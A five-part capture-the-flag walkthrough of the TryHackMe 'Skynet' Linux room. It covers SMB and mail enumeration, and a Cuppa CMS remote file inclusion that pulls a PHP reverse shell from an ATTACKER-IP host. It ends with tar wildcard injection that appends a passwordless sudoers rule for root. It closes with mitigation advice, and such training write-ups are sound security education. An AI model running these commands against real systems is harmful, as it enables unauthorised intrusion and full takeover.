# TryHackMe - Skynet Writeup (Part 1)

> **Platform:** TryHackMe
> **Difficulty:** Easy
> **Operating System:** Linux
> **Machine Name:** Skynet

---

# Overview

Today we are back with another **Easy** rated Linux machine from **TryHackMe** named **Skynet**.

Unlike machines where a single vulnerability immediately leads to compromise, Skynet focuses heavily on **enumeration** and **information gathering**. Throughout this challenge we will move between several different services including **SMB**, **POP3**, **IMAP**, and a vulnerable web application. None of these services alone reveal the complete attack path, but together they provide enough information to gain an initial foothold and eventually escalate to root.

One of the biggest lessons from this room is that every exposed service should be investigated carefully. A seemingly harmless anonymous SMB share eventually reveals credentials that can be reused elsewhere, demonstrating how small pieces of information can be chained together into a successful attack.

---

# Target Information

| Information      | Value             |
| ---------------- | ----------------- |
| Machine Name     | Skynet            |
| Platform         | TryHackMe         |
| Difficulty       | Easy              |
| Target IP        | **10.49.146.140** |
| Operating System | Linux             |

---

# Initial Reconnaissance

As with every penetration test, the first objective is identifying the services running on the target machine.

Instead of immediately scanning common ports, we perform a complete TCP scan to avoid missing services listening on non-standard ports.

```bash
nmap -p- 10.49.146.140
```

The scan returns the following open ports:

```text
22/tcp   SSH
80/tcp   HTTP
110/tcp  POP3
139/tcp  NetBIOS
143/tcp  IMAP
445/tcp  SMB
```

From these results we immediately notice several interesting attack surfaces.

* SSH is available but requires valid credentials.
* HTTP will likely host the primary application.
* POP3 and IMAP suggest an internal mail service.
* SMB shares often expose useful files or even allow anonymous access.

At this point there is no obvious entry point, so the next step is identifying software versions running behind each service.

---

# Service Enumeration

Running a version detection scan provides additional details.

```bash
nmap -sC -sV 10.49.146.140
```

Important findings include:

| Port    | Service | Version       |
| ------- | ------- | ------------- |
| 22      | SSH     | OpenSSH 7.2p2 |
| 80      | HTTP    | Apache 2.4.18 |
| 110     | POP3    | Dovecot       |
| 143     | IMAP    | Dovecot       |
| 139/445 | SMB     | Samba 4.3.11  |

The HTTP service displays a webpage titled **Skynet**, while SMB appears to allow guest authentication.

One important observation from the SMB scan is:

```text
Message signing disabled (not required)
```

Although this is not directly exploitable in this challenge, it is considered a weak configuration because it makes SMB relay attacks possible in certain environments.

Since SMB commonly leaks useful information, it becomes the first service to investigate.

---

# SMB Enumeration

To gather as much information as possible, we begin with **enum4linux**.

```bash
enum4linux 10.49.146.140
```

After a few minutes, the enumeration completes successfully.

Among the results we discover several built-in groups along with one particularly interesting local user.

```text
Unix User
-----------
milesdyson
```

Knowing valid usernames is always valuable during a penetration test because they can later be used for authentication attacks against SSH, SMB, or mail services.

The enumeration also confirms that multiple SMB shares are available.

Instead of relying solely on enum4linux, we list the available shares directly.

```bash
smbclient -L //10.49.146.140 -N
```

Output:

```text
Sharename
---------
anonymous
milesdyson
IPC$
print$
```

Immediately one share stands out.

```text
anonymous
```

Since anonymous authentication is permitted, there is no reason not to inspect its contents.

---

# Exploring the Anonymous Share

Connecting to the anonymous share is straightforward.

```bash
smbclient //10.49.146.140/anonymous -N
```

Once connected, listing the directory reveals:

```text
attention.txt

logs/
```

Although these filenames appear simple, configuration files and log files often contain valuable operational information.

The first file downloaded is:

```text
attention.txt
```

Reading its contents gives the following message.

```text
A recent system malfunction has caused various passwords to be changed.

All Skynet employees are required to change their password after seeing this.

-Miles Dyson
```

While no credentials are exposed here, this message tells us two important things.

1. Passwords have recently changed.
2. Miles Dyson is likely a legitimate employee account.

This becomes useful later because it hints that older credentials or passwords stored elsewhere may still exist.

---

# Inspecting the Log Directory

The next target is the **logs** directory.

Listing its contents reveals three files.

```text
log1.txt

log2.txt

log3.txt
```

Only **log1.txt** contains meaningful data.

After downloading the file, it becomes obvious that it consists almost entirely of password-like strings.

Examples include dozens of values similar to randomly generated passwords.

At first glance this looks extremely promising.

Since we already know the username:

```text
milesdyson
```

one possible attack path is attempting to authenticate using these discovered passwords.

---

# Initial Credential Testing

Before moving further into web enumeration, the recovered passwords are tested against the available services.

Possible authentication targets include:

* SMB
* POP3
* IMAP
* SSH

Unfortunately, none of the initial attempts succeed.

Although the password list appears useful, it does not immediately provide valid credentials.

Rather than forcing the issue with aggressive brute forcing, it is better to continue enumerating other exposed services.

Very often one service provides the missing context required to make another attack successful.

At this stage we have learned several valuable pieces of information:

* The target hosts multiple authentication services.
* Anonymous SMB access is enabled.
* A valid local username exists.
* Internal password-related files have been exposed.
* No immediate authentication bypass is available.

These findings strongly suggest that the next stage of the attack should focus on the web application, which may reveal where these credentials are actually intended to be used.

---

# Summary of Progress

So far we have:

* Identified all publicly exposed services.
* Enumerated software versions.
* Identified the local user **milesdyson**.
* Enumerated SMB shares.
* Accessed the anonymous share without authentication.
* Downloaded internal log files.
* Recovered a list of possible passwords.
* Confirmed that the credentials are not immediately valid against the exposed services.

The next phase of the assessment will shift toward the web server, where further enumeration eventually reveals the SquirrelMail portal and the hidden CMS that provides the initial foothold.

---

**End of Part 1**

# TryHackMe - Skynet Writeup (Part 2)

---

# Web Enumeration

After exhausting the anonymous SMB share, the next logical target is the web server running on **port 80**.

Although the homepage itself does not immediately reveal anything useful, hidden directories and administrative panels are common in web applications. Therefore, directory enumeration is the next step.

Using Gobuster:

```bash
gobuster dir \
-u http://10.49.146.140 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

The scan discovers several directories.

```text
/admin
/config
/css
/js
/ai
/squirrelmail
```

Most of these directories either contain static resources or configuration pages that do not provide an immediate attack path.

However, one directory immediately stands out.

```text
/squirrelmail
```

Since both **POP3** and **IMAP** were discovered during the initial Nmap scan, finding a webmail application makes perfect sense. This is now the primary target for further investigation.

---

# Discovering SquirrelMail

Browsing to the newly discovered directory presents the login page for **SquirrelMail**.

The version displayed is:

```text
SquirrelMail version 1.4.23 [SVN]
```

Before searching for public exploits, it is always worth checking whether valid credentials have already been discovered during previous enumeration.

Earlier, while exploring the anonymous SMB share, we downloaded **log1.txt**, which contained a long list of password-like strings.

We also identified the valid username:

```text
milesdyson
```

Instead of attempting an exploit immediately, we first test the recovered credentials against the mail portal.

---

# Credential Testing

Using the username obtained from SMB enumeration together with the passwords found inside **log1.txt**, one of the credentials successfully authenticates.

```text
Username:
milesdyson

Password:
cyborg007haloterminator
```

Authentication succeeds, providing access to Miles Dyson's mailbox.

This highlights an important lesson:

> Information gathered from one service often becomes the key to compromising another.

Without enumerating SMB first, these credentials would never have been discovered.

---

# Reviewing the Mailbox

Once inside the mailbox, the available emails are reviewed carefully.

One message immediately attracts attention because it references a recent system malfunction.

Opening the email reveals the following information.

```text
We have changed your SMB password after system malfunction.

Password:

)s{A&2Z=F^n_E.B`
```

This is exactly what we needed.

Earlier, authentication to the **milesdyson** SMB share failed because we did not know the correct password.

The mailbox has now provided the updated credentials.

---

# Accessing the Miles Dyson SMB Share

Returning to SMB, we authenticate using the newly recovered password.

```bash
smbclient //10.49.146.140/milesdyson -U milesdyson
```

After entering the password from the email, access is granted successfully.

Listing the contents reveals several files.

```text
Improving Deep Neural Networks.pdf

Natural Language Processing.pdf

Convolutional Neural Networks.pdf

Neural Networks and Deep Learning.pdf

Structuring your Machine Learning Project.pdf

notes/
```

The PDF documents appear to be study material and are not immediately relevant to the attack.

Instead, attention shifts toward the **notes** directory.

---

# Inspecting the Notes Directory

Entering the directory reveals an important text file.

```text
important.txt
```

Reading the file displays:

```text
1. Add features to beta CMS /45kra24zxs28v3yd

2. Work on T-800 Model 101 blueprints

3. Spend more time with my wife
```

The second and third items appear to be personal reminders.

The first entry, however, is extremely valuable.

It references a **beta CMS** along with what appears to be a hidden directory.

```text
/45kra24zxs28v3yd
```

This immediately becomes the next target.

---

# Investigating the Hidden CMS

Navigating to the discovered directory reveals another web application.

At first glance, there are no obvious vulnerabilities.

Several common attack techniques are attempted, including:

* Local File Inclusion (LFI)
* Remote Code Execution (RCE)
* Basic parameter manipulation

None of these approaches produce useful results.

Rather than forcing exploitation, further enumeration is performed.

This is an important habit during penetration testing:

> When exploitation fails, return to enumeration instead of repeatedly attacking the same endpoint.

---

# Additional Directory Enumeration

Since the CMS appears incomplete, another directory scan is launched against the newly discovered application.

This time additional directories are identified.

```text
administrator
```

Opening the administrator directory reveals the CMS administration interface.

From the page structure and source code, the application is identified as:

```text
Cuppa CMS
```

Knowing the exact CMS is extremely valuable because public vulnerabilities can now be researched with much greater accuracy.

---

# Researching the CMS

Searching public exploit databases reveals that **Cuppa CMS** is affected by a well-known **Remote File Inclusion (RFI)** vulnerability.

Rather than blindly testing payloads, the vulnerability documentation explains exactly how the vulnerable parameter works.

The vulnerable endpoint accepts a URL through the following parameter.

```text
urlConfig=
```

Instead of loading a local configuration file, the application is capable of retrieving a remote PHP file from an attacker-controlled server.

This creates an ideal opportunity to obtain Remote Code Execution.

---

# Preparing the Payload

A standard PHP reverse shell is placed inside the attack machine's web server.

The vulnerable request is then modified so that the CMS loads the remote payload.

Example:

```text
http://TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER-IP:8000/php-reverse-shell.php
```

Before triggering the exploit, a Netcat listener is started.

```bash
nc -lvnp 4444
```

Everything is now prepared for remote code execution.

The next step is executing the payload, obtaining the reverse shell, stabilizing the session, and beginning local privilege escalation.

---

# Summary of Progress

During this stage we successfully:

* Enumerated hidden web directories.
* Identified the SquirrelMail portal.
* Reused credentials discovered from SMB enumeration.
* Logged into Miles Dyson's mailbox.
* Recovered the updated SMB password.
* Authenticated to the private SMB share.
* Downloaded internal notes.
* Discovered the hidden beta CMS.
* Identified the application as **Cuppa CMS**.
* Confirmed the CMS is vulnerable to **Remote File Inclusion (RFI)**.
* Prepared a reverse shell for exploitation.

The next stage focuses on exploiting the vulnerable CMS, obtaining a reverse shell, stabilizing the session, retrieving the user flag, and beginning privilege escalation enumeration.

---

**End of Part 2**

# TryHackMe - Skynet Writeup (Part 3)

---

# Exploiting Cuppa CMS

After identifying the application as **Cuppa CMS**, the next step is validating whether the publicly documented vulnerability is actually exploitable.

During the previous phase we attempted several common techniques such as Local File Inclusion (LFI) and simple Remote Code Execution (RCE), but none of them produced useful results. Instead of continuing with blind testing, we researched the CMS version and discovered that **Cuppa CMS** is vulnerable to **Remote File Inclusion (RFI)**.

One public reference describing this issue is:

```text id="t0an7v"
https://github.com/CuppaCMS/CuppaCMS/issues/18
```

The vulnerability exists because the application accepts a user-controlled URL through the `urlConfig` parameter and includes the remote file without proper validation.

This means that if we host a malicious PHP file on our attack machine, the vulnerable application will fetch and execute it on the server.

---

# Preparing the Reverse Shell

To exploit the vulnerability, we first prepare a PHP reverse shell.

A standard PHP reverse shell is copied into our working directory and served using a simple HTTP server.

```bash id="zrmv2y"
python3 -m http.server 8000
```

At the same time, a Netcat listener is started on another terminal to receive the incoming connection.

```bash id="v3ep4r"
nc -lvnp 4444
```

Now both components are ready:

* HTTP Server → Hosts the malicious PHP file
* Netcat Listener → Waits for the reverse shell

---

# Triggering the Remote File Inclusion

The vulnerable endpoint is accessed with the following request.

```text id="7jjlwm"
http://10.49.146.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER-IP:8000/php-reverse-shell.php
```

When this URL is opened in the browser, the server downloads the remote PHP file and immediately executes it.

Within a few seconds, the Netcat listener receives a connection.

```text id="n5vm6k"
connect to [ATTACKER-IP] from 10.49.146.140
```

A shell is successfully established.

---

# Initial Shell Access

Checking the current user confirms that the exploit executed successfully.

```bash id="ygc56m"
id
```

Output:

```text id="q3qwv8"
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

At this point we have command execution as the **www-data** user.

Although this is enough to begin enumeration, the shell is very limited and lacks features such as command history, tab completion, and interactive terminal support.

The next task is stabilizing the shell.

---

# Shell Stabilization

The first step is spawning a proper Bash shell using Python.

```bash id="m5u1dl"
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next, background the current Netcat session.

```text id="b9zws8"
CTRL + Z
```

On the attacking machine, configure the terminal.

```bash id="kbo6rq"
stty raw -echo
```

Bring the session back into the foreground.

```bash id="8b4xg9"
fg
```

Finally, configure the terminal type.

```bash id="x4vkcf"
export TERM=xterm-256color
```

The shell is now fully interactive and much easier to work with.

---

# Enumerating the System

With a stable shell available, basic enumeration begins.

The first objective is understanding the filesystem layout.

Listing the contents of the `/home` directory reveals another user.

```text id="m8mzh9"
milesdyson
```

Navigating into the home directory provides access to several folders.

Among them is the user's flag.

Reading the file:

```bash id="eqy7l4"
cat user.txt
```

returns:

```text id="4cw0y6"
7ce5c2109a40f958099283600a9ae807
```

The initial objective has now been completed.

---

# Beginning Privilege Escalation

Although obtaining the user flag confirms successful exploitation, the machine is not yet fully compromised.

The next goal is gaining root privileges.

The first instinct is checking whether the compromised account has any sudo permissions.

```bash id="whkq7y"
sudo -l
```

Unfortunately, this does not provide any useful results.

Since manual enumeration alone can easily overlook privilege escalation vectors, an automated enumeration script is executed.

---

# Running LinPEAS

LinPEAS is uploaded to the target and executed.

```bash id="9dgt0j"
./linpeas.sh
```

The script performs a comprehensive security audit of the host.

Among the findings are several SUID binaries.

```text id="qzckmg"
/usr/bin/screen

/usr/bin/expiry

/usr/bin/at

/usr/bin/ssh-agent

/usr/bin/wall
```

LinPEAS also highlights:

```text id="5b4gw9"
snap-confine
```

along with references to historical privilege escalation vulnerabilities.

Although these findings initially appear promising, further investigation shows that they are **not the intended privilege escalation path** for this room.

Instead of attempting unrelated exploits, enumeration continues.

---

# Discovering the Backup Directory

One of the most interesting findings produced by LinPEAS is located inside Miles Dyson's home directory.

```text id="vfdajf"
/home/milesdyson/backups
```

Inside this directory are two files.

```text id="ktzhpj"
backup.sh

backup.tgz
```

The permissions immediately attract attention.

```text id="p2a67r"
backup.sh

Owner:
root

Permissions:
Executable
```

Whenever an executable script owned by root is discovered, it deserves careful inspection because it may be executed automatically through cron.

Opening the script reveals:

```bash id="y1jwba"
cat backup.sh
```

Contents:

```bash id="pg6j4v"
#!/bin/bash

cd /var/www/html

tar cf /home/milesdyson/backups/backup.tgz *
```

At first glance the script looks harmless.

It simply changes into the web root and archives every file using `tar`.

However, experienced penetration testers immediately recognize something dangerous.

The command archives files using the wildcard:

```text id="1hlpm9"
*
```

instead of explicitly specifying filenames.

This is a classic indicator of a **tar wildcard injection** vulnerability.

Before attempting exploitation, however, we still need to understand **how** and **when** this script is executed.

That investigation becomes the focus of the final stage of the machine.

---

# Summary of Progress

During this stage we successfully:

* Confirmed the Cuppa CMS Remote File Inclusion vulnerability.
* Hosted a PHP reverse shell.
* Triggered the vulnerable endpoint.
* Obtained Remote Code Execution as **www-data**.
* Stabilized the shell using Python PTY.
* Retrieved the user flag.
* Executed LinPEAS for automated enumeration.
* Identified multiple SUID binaries.
* Discovered the root-owned backup script.
* Recognized the potential **tar wildcard injection** vulnerability that will later lead to privilege escalation.

The next and final stage focuses entirely on privilege escalation by investigating the backup process, identifying the scheduled cron job, exploiting the tar wildcard vulnerability, and obtaining full root access.

---

**End of Part 3**

# TryHackMe - Skynet Writeup (Part 4)

---

# Privilege Escalation

At this stage we have already obtained a stable shell as the **www-data** user and successfully captured the user flag. The only remaining objective is escalating our privileges to **root**.

During the previous phase, LinPEAS highlighted a backup directory owned by **Miles Dyson**. Although several SUID binaries were also discovered, none of them appeared to be the intended attack vector for this machine.

Instead of wasting time exploiting every possible binary, we continue with manual enumeration to understand how the system performs automated tasks.

---

# Reviewing Sudo Permissions

The first step is checking whether the compromised account has any sudo privileges.

```bash id="p7kg3d"
sudo -l
```

Unfortunately, no useful permissions are available.

Since there is no direct privilege escalation through sudo, another vector must exist.

---

# Reviewing Interesting Files

From the previous LinPEAS scan we discovered a backup directory.

```text id="1u3mrx"
/home/milesdyson/backups
```

Listing the directory shows two files.

```text id="eyqq1t"
backup.sh

backup.tgz
```

The shell script immediately becomes interesting because it is owned by **root**.

```text id="wfp75w"
-rwxr-xr-x 1 root root backup.sh
```

Whenever an executable shell script is owned by root, it is worth investigating because these scripts are often executed automatically by scheduled tasks.

Reading the contents reveals:

```bash id="7c6l8j"
cat backup.sh
```

Output:

```bash id="q1g6af"
#!/bin/bash

cd /var/www/html

tar cf /home/milesdyson/backups/backup.tgz *
```

Initially this looks like a simple backup script.

However, one small detail is extremely important.

The script archives every file using:

```text id="bgvqmr"
*
```

rather than specifying filenames explicitly.

This wildcard becomes the foundation of the privilege escalation.

Before exploiting it, we still need to understand **how** the script is executed.

---

# Investigating Scheduled Tasks

Linux systems commonly automate maintenance using **cron jobs**.

The global cron configuration is located at:

```text id="ey7m5v"
/etc/crontab
```

Viewing the configuration:

```bash id="3dlzy6"
cat /etc/crontab
```

reveals:

```text id="bpxvhv"
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

This entry tells us several important things.

* The script executes every **one minute**.
* It executes as the **root** user.
* The current user does not need permission to run it manually because cron will execute it automatically.

At this point we know exactly where our privilege escalation will occur.

---

# Understanding the Vulnerability

Let's examine the critical line again.

```bash id="dh2lg4"
tar cf /home/milesdyson/backups/backup.tgz *
```

The command changes into:

```text id="r4k1nx"
/var/www/html
```

and archives **every file** inside that directory.

The important detail is that the shell expands the wildcard (`*`) before `tar` processes the command.

Normally, the wildcard simply expands into filenames such as:

```text id="89flj5"
index.html

style.css

config

admin
```

However, Linux does not distinguish between filenames and command-line options during wildcard expansion.

If a filename begins with:

```text id="tly2aj"
--
```

then `tar` interprets that filename as an option instead of a normal file.

This behavior is known as **Tar Wildcard Injection**.

---

# Why Tar Wildcard Injection Works

GNU Tar supports several command-line arguments.

Two particularly useful options are:

```text id="qtmg9o"
--checkpoint

--checkpoint-action
```

Normally these options are used for monitoring archive progress.

However, the `--checkpoint-action` option can also execute arbitrary commands.

If an attacker can create files named after these options, and a privileged script archives them using a wildcard, tar unknowingly executes the attacker's command.

This is exactly the situation we have here.

---

# Preparing the Payload

Since the backup script archives everything inside:

```text id="g9xzvl"
/var/www/html
```

we move into that directory.

```bash id="r93e8m"
cd /var/www/html
```

The next step is creating a shell script that will be executed by tar.

```bash id="n68v2r"
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root-shell.sh
```

This payload appends a new entry into the sudoers configuration.

Once executed by root, the **www-data** account will gain unrestricted sudo privileges.

---

# Creating the Malicious Tar Options

Next we create two specially crafted filenames.

The first file:

```bash id="7hjv0w"
echo "/var/www/html" > --checkpoint=1
```

The second file:

```bash id="9gt6me"
echo "/var/www/html" > "--checkpoint-action=exec=sh root-shell.sh"
```

Listing the directory now shows:

```text id="sxr4w6"
--checkpoint=1

--checkpoint-action=exec=sh root-shell.sh

root-shell.sh
```

Although these appear to be ordinary files, the wildcard inside the backup script will cause tar to interpret them as command-line arguments.

No further interaction is required.

We simply wait for cron to execute the backup script.

---

# Waiting for Cron

Because the scheduled task runs every minute, we only need to wait a short time.

Once cron starts executing the backup script as root, tar processes our malicious filenames.

Internally, the command effectively becomes:

```text id="cfkpdr"
tar cf backup.tgz

--checkpoint=1

--checkpoint-action=exec=sh root-shell.sh

*
```

Instead of simply creating an archive, tar executes:

```text id="us3x9y"
sh root-shell.sh
```

Since cron launched the script as **root**, our payload also executes with **root privileges**.

The sudoers file is successfully modified.

---

# Verifying the Exploit

After approximately one minute, we check sudo permissions once again.

```bash id="cxr7cl"
sudo -l
```

This time the output is completely different.

```text id="w8x2kd"
User www-data may run the following commands on skynet:

(root) NOPASSWD: ALL
```

The privilege escalation has succeeded.

The compromised account can now execute **any command as root** without supplying a password.

---

# Obtaining Root

With unrestricted sudo access available, obtaining a root shell is trivial.

```bash id="7f79m3"
sudo bash
```

The prompt immediately changes.

```text id="e6vl4t"
root@skynet
```

Confirming our identity:

```bash id="ucgzmb"
id
```

Output:

```text id="o7ud5p"
uid=0(root)

gid=0(root)
```

The final objective is retrieving the root flag.

```bash id="l5qqq6"
cat /root/root.txt
```

Output:

```text id="v3cc7x"
3f0372db24753accc7179a282cd6a949
```

The machine has now been fully compromised.

---

# Summary of Progress

During the final stage we successfully:

* Investigated the backup script discovered during enumeration.
* Identified that the script was executed automatically every minute by cron.
* Recognized the use of wildcard expansion inside a privileged tar command.
* Explained why GNU Tar interprets specially crafted filenames as command-line options.
* Created malicious checkpoint option files.
* Forced tar to execute an attacker-controlled shell script.
* Modified the sudoers configuration.
* Obtained unrestricted sudo privileges.
* Spawned a root shell.
* Retrieved the root flag.

The next section concludes the writeup with the complete attack flow, vulnerabilities identified, remediation recommendations, and key takeaways.

---

**End of Part 4**

# TryHackMe - Skynet Writeup (Part 5)

---

# Complete Attack Flow

The entire compromise of the Skynet machine followed a logical chain where each stage provided information required for the next one. No single vulnerability alone resulted in complete system compromise; instead, multiple weaknesses were combined.

```text
External Reconnaissance
        │
        ▼
Full TCP Port Scan
        │
        ▼
Identify SMB, HTTP, POP3 & IMAP Services
        │
        ▼
Anonymous SMB Enumeration
        │
        ▼
Download Internal Files
        │
        ▼
Discover Miles Dyson Username
        │
        ▼
Recover Password List (log1.txt)
        │
        ▼
Enumerate Web Application
        │
        ▼
Discover SquirrelMail Portal
        │
        ▼
Authenticate to Webmail
        │
        ▼
Recover Updated SMB Password
        │
        ▼
Access Miles Dyson SMB Share
        │
        ▼
Discover Hidden Beta CMS
        │
        ▼
Identify Cuppa CMS
        │
        ▼
Research Public Vulnerability
        │
        ▼
Exploit Remote File Inclusion
        │
        ▼
Reverse Shell as www-data
        │
        ▼
Stabilize Shell
        │
        ▼
Enumerate Cron Jobs
        │
        ▼
Discover Root Backup Script
        │
        ▼
Identify Tar Wildcard Injection
        │
        ▼
Execute Payload as Root
        │
        ▼
Gain Passwordless Sudo
        │
        ▼
Root Shell
        │
        ▼
Capture Root Flag
```

---

# Vulnerabilities Identified

Throughout this machine, several security weaknesses were identified. Individually, most of them are not critical, but together they create a complete compromise path.

## 1. Anonymous SMB Share

The SMB service allowed unauthenticated users to browse internal files.

This exposed:

* Employee notices
* Internal logs
* Password-related information
* Valid usernames

Although these files did not directly reveal credentials, they provided enough intelligence to continue the attack.

**Risk**

Information Disclosure

---

## 2. Credential Exposure

The anonymous share exposed a password list inside **log1.txt**.

While the passwords did not immediately work against SMB, one of them successfully authenticated to the webmail application.

This demonstrates why internal log files should never be accessible to unauthenticated users.

**Risk**

Credential Disclosure

---

## 3. Password Reuse

The same employee account was used across multiple services.

After successfully authenticating to SquirrelMail, another password was recovered that granted access to the private SMB share.

This is a classic example of lateral movement through credential reuse.

**Risk**

Credential Reuse

---

## 4. Sensitive Information Stored in Email

The mailbox contained the updated SMB password in plain text.

Emails frequently contain sensitive operational information and should never be considered a secure credential storage mechanism.

If a mailbox becomes compromised, attackers often gain access to multiple internal services.

**Risk**

Sensitive Information Exposure

---

## 5. Hidden Administrative Interface

Although the CMS directory was hidden using a random path, it was still publicly accessible.

Security through obscurity is not an effective defense.

Directory enumeration eventually revealed the application.

**Risk**

Poor Access Control

---

## 6. Vulnerable Cuppa CMS

The installed CMS contained a publicly known **Remote File Inclusion (RFI)** vulnerability.

Because the application accepted user-controlled URLs without proper validation, arbitrary PHP code could be executed on the server.

This vulnerability provided the initial shell.

**Risk**

Remote Code Execution

---

## 7. Insecure Backup Automation

The backup script executed every minute with root privileges.

Instead of explicitly specifying files, it relied on wildcard expansion.

```bash
tar cf backup.tgz *
```

This allowed filenames beginning with `--` to be interpreted as command-line arguments.

**Risk**

Privilege Escalation

---

## 8. Tar Wildcard Injection

GNU Tar supports several command-line options capable of executing commands.

Because wildcard expansion occurred before the tar command executed, attacker-controlled filenames became executable parameters.

This resulted in arbitrary command execution as root.

**Risk**

Privilege Escalation

---

# Lessons Learned

This room demonstrates that successful penetration testing is rarely about finding one "magic exploit."

Instead, attackers continuously collect information until enough pieces fit together.

Some important lessons include:

### Enumeration is the most important phase.

Without enumerating SMB shares, the username would never have been discovered.

Without downloading the log files, valid credentials would never have been identified.

Without reading the mailbox, the private SMB password would remain unknown.

Each stage depended entirely on information gathered during the previous one.

---

### Every Service Matters

Many beginners focus only on web applications.

Skynet proves why every exposed service deserves equal attention.

In this machine we interacted with:

* SMB
* HTTP
* POP3
* IMAP
* Cron
* Linux File Permissions

Each service contributed something important to the final compromise.

---

### Public Exploits Should Be Verified

Finding Cuppa CMS was only the beginning.

Instead of immediately running exploit scripts, understanding **why** the vulnerability existed made exploitation much easier.

Researching the CMS explained how the vulnerable parameter behaved, allowing manual exploitation.

---

### Automated Enumeration is Helpful

LinPEAS did not directly hand us the privilege escalation.

Instead, it highlighted files worth investigating.

Understanding **why** those files mattered was far more important than simply running the tool.

Automation accelerates enumeration, but manual analysis remains essential.

---

### Scheduled Tasks are High-Value Targets

Cron jobs execute automatically and frequently run with elevated privileges.

Whenever a scheduled task manipulates user-controlled files, it deserves careful inspection.

In this room, a single wildcard inside a root-owned backup script completely compromised the system.

---

# Mitigation Recommendations

The following security improvements would prevent the attack chain demonstrated in this room.

## SMB

* Disable anonymous access.
* Restrict access using authentication.
* Remove sensitive files from public shares.

---

## Credential Management

* Avoid password reuse across services.
* Enforce unique passwords.
* Implement Multi-Factor Authentication wherever possible.

---

## Mail Security

* Never distribute passwords through email.
* Use secure password management solutions.
* Encrypt sensitive communications whenever possible.

---

## Web Application Security

* Keep Cuppa CMS updated.
* Remove unused applications.
* Validate all user-supplied input.
* Disable Remote File Inclusion.

---

## Cron Jobs

* Never execute privileged scripts against directories writable by unprivileged users.
* Avoid wildcard expansion inside privileged scripts.
* Specify filenames explicitly whenever possible.

---

## Principle of Least Privilege

Services should operate with the minimum permissions required.

Reducing unnecessary privileges significantly limits the impact of successful exploitation.

---

# Skills Practiced

During this room the following practical skills were demonstrated:

* Network Enumeration
* Nmap Service Detection
* SMB Enumeration
* Enum4linux
* SMB Authentication
* SquirrelMail Enumeration
* Credential Reuse
* Directory Enumeration
* CMS Fingerprinting
* Public Vulnerability Research
* Remote File Inclusion (RFI)
* Reverse Shell Generation
* Shell Stabilization
* Linux Enumeration
* LinPEAS Usage
* Cron Job Analysis
* Tar Wildcard Injection
* Linux Privilege Escalation

---

# Key Takeaways

Skynet is an excellent beginner-friendly machine because it teaches one of the most valuable lessons in penetration testing: **enumeration is more important than exploitation**.

At no point did a single vulnerability immediately provide complete access. Instead, the attack relied on carefully collecting information from multiple services. Anonymous SMB shares exposed usernames and password-related files, those credentials unlocked the webmail portal, the mailbox revealed new SMB credentials, the private SMB share exposed the hidden CMS, and finally a vulnerable backup process resulted in full system compromise.

The privilege escalation phase is particularly educational because it demonstrates a real-world misconfiguration rather than a kernel exploit. A simple cron job combined with GNU Tar's wildcard processing allowed arbitrary command execution as root, highlighting how insecure automation can introduce severe security risks.

Overall, this room reinforces the importance of thorough enumeration, understanding how different services interact, validating publicly known vulnerabilities, and manually analyzing privilege escalation opportunities instead of relying solely on automated tools.

---

# Flags

## User Flag

```text
7ce5c2109a40f958099283600a9ae807
```

## Root Flag

```text
3f0372db24753accc7179a282cd6a949
```

---

# Conclusion

Skynet is an outstanding introductory Linux machine that emphasizes methodology over complexity. Rather than requiring advanced exploitation techniques, it rewards patience, careful enumeration, and the ability to connect information gathered from different services. From anonymous SMB shares and credential reuse to exploiting a vulnerable CMS and abusing a misconfigured cron backup process, every stage reinforces real-world penetration testing concepts. Successfully completing this room provides hands-on experience with service enumeration, web application assessment, Linux privilege escalation, and attack chaining—skills that form a strong foundation for tackling more advanced Capture The Flag challenges and real-world security assessments.

**End of Writeup - Jai Shri Ram**
